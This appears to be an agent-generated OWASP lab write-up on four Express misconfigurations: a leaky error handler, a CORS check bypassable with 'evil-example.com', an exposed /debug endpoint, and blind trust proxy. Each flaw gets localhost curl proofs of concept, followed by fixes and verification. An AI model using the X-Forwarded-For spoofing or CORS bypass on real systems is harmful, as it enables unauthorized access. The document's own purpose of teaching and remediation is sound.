## OWASP Category

A02:2025 — Security Misconfiguration

---

## Location

- `src/errorHandler.ts` — verbose error handler leaking stack traces and raw error objects
- `src/app.ts` — multiple misconfigurations:
  - Lines 9–13: Bypassable CORS whitelist using `endsWith('example.com')`
  - Lines 15–24: Exposed `/debug` endpoint dumping environment variables, system info, and dependency versions
  - Line 7: `app.set('trust proxy', true)` without IP restriction, enabling IP spoofing
  - Missing security headers (`X-Powered-By` exposed, no Helmet, no HSTS, no CSP)

---

## Description

The Express application contains four distinct security misconfigurations that chain together to expose sensitive internal information and allow access control bypass:

1. **Verbose Error Handler:** The global error handler returns `err.stack` and `err.raw` to the client, leaking file paths, line numbers, internal module names, and the host username.

2. **Bypassable CORS Whitelist:** A custom CORS handler uses `endsWith('example.com')` to validate origins. An attacker can register `evil-example.com` and the check passes, allowing cross-origin credentialed requests from attacker-controlled domains.

3. **Exposed Debug Endpoint:** The `/debug` route returns `process.env`, Node version, platform, architecture, uptime, memory usage, and `package.json` dependencies. This leaks secrets, system fingerprinting data, and exact dependency versions for CVE targeting.

4. **Blind `trust proxy`:** `app.set('trust proxy', true)` trusts any `X-Forwarded-For` header without validating the proxy's IP. An attacker can spoof `req.ip` as `127.0.0.1` to bypass localhost-only access controls.

---

## Proof of Concept

### 1. Verbose Error Handler — Stack Trace Leakage

**Request:**
```bash
curl -s http://localhost:3000/api/crash
```

**Response:**
```json
{
  "error": "Simulated database connection failure",
  "stack": "Error: Simulated database connection failure\\n    at <anonymous> (/home/grah4na/projects/owasp-top10-lab/exploits/A02/src/app.ts:18:9)\\n    at Layer.handleRequest (/home/grah4na/projects/owasp-top10-lab/exploits/A02/node_modules/router/lib/layer.js:152:17)\\n    ...",
  "raw": {}
}
```

**Leaked:** Full file paths, line numbers, internal module paths (`node_modules/router/lib/layer.js`), host username (`grah4na`), project directory structure.

---

### 2. Bypassable CORS Whitelist

**Blocked request (no CORS headers):**
```bash
curl -i -H "Origin: https://evil.com" http://localhost:3000/api/health
```

**Response:**
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 15

{"status":"ok"}
```

**Bypassed request (CORS headers present):**
```bash
curl -i -H "Origin: https://evil-example.com" http://localhost:3000/api/health
```

**Response:**
```
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: https://evil-example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Content-Length: 15

{"status":"ok"}
```

**Impact:** Attacker-controlled domain `evil-example.com` can make credentialed cross-origin requests to the API.

---

### 3. Exposed Debug Endpoint

**Request:**
```bash
curl -s http://localhost:3000/debug
```

**Response (truncated):**
```json
{
  "env": {
    "KDE_FULL_SESSION": "true",
    "USER": "grah4na",
    "PAM_KWALLET5_LOGIN": "/run/user/1000/kwallet5.socket",
    "npm_node_execpath": "/home/grah4na/.hermes/node/bin/node",
    "GIT_ASKPASS": "/usr/share/code/resources/app/extensions/git/dist/askpass.sh",
    ...
  },
  "nodeVersion": "v22.22.3",
  "platform": "linux",
  "arch": "x64",
  "uptime": 123.456,
  "memory": {
    "rss": 45678912,
    "heapTotal": 23456789,
    ...
  },
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^5.0.0"
  }
}
```

**Leaked:** Environment variables (potential secrets), username, home directory paths, IDE in use, Node version, OS platform, dependency versions for CVE targeting.

---

### 4. Blind `trust proxy` — IP Spoofing Bypass

**Normal request (blocked):**
```bash
curl -i http://localhost:3000/admin
```

**Response:**
```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 56

{"error":"Forbidden: admin only from localhost"}
```

**Spoofed request (bypassed):**
```bash
curl -i -H "X-Forwarded-For: 127.0.0.1" http://localhost:3000/admin
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 65

{"secret":"admin panel data","flag":"A02-TRUST-PROXY-BYPASS"}
```

**Impact:** Any internet user can bypass localhost-only restrictions by sending a fake `X-Forwarded-For` header.

---

## Root Cause

1. **Verbose error handler:** Developer enabled full error details in all environments without environment-gating. Stack traces are useful in development but must never reach production clients.

2. **Bypassable CORS:** Developer attempted to restrict origins but used a naive string check (`endsWith`) instead of an exact whitelist or a proper CORS library with strict origin validation.

3. **Exposed debug endpoint:** Developer left a troubleshooting route in production without authentication, IP restriction, or environment-gating. `process.env` and `package.json` were read at runtime without filtering.

4. **Blind `trust proxy`:** Developer enabled `trust proxy` to support reverse proxies but used `true` (trust any client) instead of restricting to known proxy IPs or subnets.

---

## Impact

| Vuln | CVSS-like severity | Real-world impact |
|------|-------------------|-------------------|
| Verbose errors | Medium | Information disclosure aids reconnaissance, reveals server structure, narrows exploit research |
| Bypassable CORS | High | Attacker-controlled sites can steal session cookies, perform actions on behalf of authenticated users |
| Debug endpoint | High | Full system fingerprinting, secret leakage, dependency version enumeration for CVE exploitation |
| Trust proxy bypass | Critical | Complete bypass of IP-based access controls (admin panels, internal APIs, rate limiters) |

**Chained impact:** An attacker probes `/debug` to learn the stack, triggers `/api/crash` to map file paths, spoofs `X-Forwarded-For` to access `/admin`, and hosts `evil-example.com` to perform cross-origin attacks against authenticated users.

---

## Fix

### 1. Secure Error Handler

```typescript
// src/errorHandler.ts
import { Request, Response, NextFunction } from 'express';

const isDev = process.env.NODE_ENV === 'development';

export function errorHandler(err: any, _req: Request, res: Response, _next: NextFunction) {
  console.error(err); // log full error server-side

  res.status(err.status || 500).json({
    error: isDev ? err.message : 'Internal Server Error',
    ...(isDev && { stack: err.stack }), // only in dev
  });
}
```

### 2. Strict CORS Whitelist

```typescript
import cors from 'cors';

const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
}));
```

### 3. Remove or Protect Debug Endpoint

**Option A — Remove entirely:**
Delete the `/debug` route from production builds.

**Option B — Gate behind auth + IP:**
```typescript
app.get('/debug', requireAuth, (req: Request, res: Response) => {
  if (req.ip !== '127.0.0.1') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // ... limited debug info, never full process.env
});
```

### 4. Restrict `trust proxy`

```typescript
// Only trust specific proxy IPs/subnets
app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);
// Or explicit: app.set('trust proxy', ['10.0.0.0/8', '172.16.0.0/12']);
```

### 5. Add Security Headers (Helmet)

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true },
}));
```

---

## Verification (Post-Fix)

```bash
# 1. Errors no longer leak stack traces
curl -s http://localhost:3000/api/crash
# → {"error":"Internal Server Error"}

# 2. CORS blocked for unauthorized origins
curl -i -H "Origin: https://evil-example.com" http://localhost:3000/api/health
# → No Access-Control-Allow-Origin header

# 3. Debug endpoint removed or 403
curl -s http://localhost:3000/debug
# → 404 Not Found

# 4. Admin blocked even with spoofed header
curl -i -H "X-Forwarded-For: 127.0.0.1" http://localhost:3000/admin
# → 403 Forbidden

# 5. Security headers present
curl -i http://localhost:3000/api/health
# → X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Strict-Transport-Security, etc.
```

---

## References

- [OWASP Top 10 2025 — A02 Security Misconfiguration](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/)
- [Express trust proxy documentation](https://expressjs.com/en/guide/behind-proxies.html)
- [Helmet.js security headers](https://helmetjs.github.io/)
- [CORS specification — credentials with wildcard](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials)
"""

with open('/mnt/agents/output/A02-security-misconfiguration.md', 'w') as f:
    f.write(doc)

print("Done.")
